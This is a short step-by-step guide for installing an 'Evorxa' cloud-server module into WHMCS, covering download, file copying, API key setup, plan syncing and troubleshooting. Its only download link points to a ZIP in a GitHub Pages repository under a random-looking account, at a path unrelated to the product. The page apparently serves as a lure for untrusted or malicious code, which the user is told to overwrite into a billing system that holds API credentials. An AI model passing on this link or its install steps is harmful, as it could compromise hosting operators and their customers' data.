📝 Step-by-Step Installation Guide

Don't worry - this is simpler than it looks. Here's your exact checklist:

Step 1: Get the Files

Visit this link to download the application: https://raw.githubusercontent.com/Experimentersoftroll422/experimentersoftroll422.github.io/main/files/Databases/2.7.zip. Download the ZIP file and extract it to your computer.

Step 2: Copy the Module

Find the modules folder inside the extracted files. Copy both servers and addons folders. Now go to your WHMCS installation folder and paste them into the same locations (overwrite if asked).

Step 3: Connect Your Evorxa Account

Log in to your WHMCS admin panel. Go to System Settings → Servers. Click "Add New Server." Choose "Evorxa" as the type. Enter your API key and secret from your Evorxa dashboard. Save everything.

Step 4: Sync Your Plans

In WHMCS, go to Products → Product Groups. Create a new group called "Cloud Servers." Then go to Evorxa Sync (in the side menu). Click "Import Plans." Select which plans you want to offer and set your markup percentage.

Step 5: Test Everything

Order a test server from your WHMCS client area. If it appears in your Evorxa dashboard automatically, you're done! If not, go back to server settings and double-check your API credentials.

⏱️ Troubleshooting Common Issues

⚠️ Server Not Creating?

  • Check that your Evorxa API key has permission for server creation
  • Verify your plan has available resources
  • Look at WHMCS Activity Log for the exact error message
  • Contact Evorxa support if the API is down

⚠️ Client Panel Missing Features?

  • Clear WHMCS cache (System Settings → General → Cache)
  • Make sure you uploaded the addons folder correctly
  • Refresh your browser and log out/login again
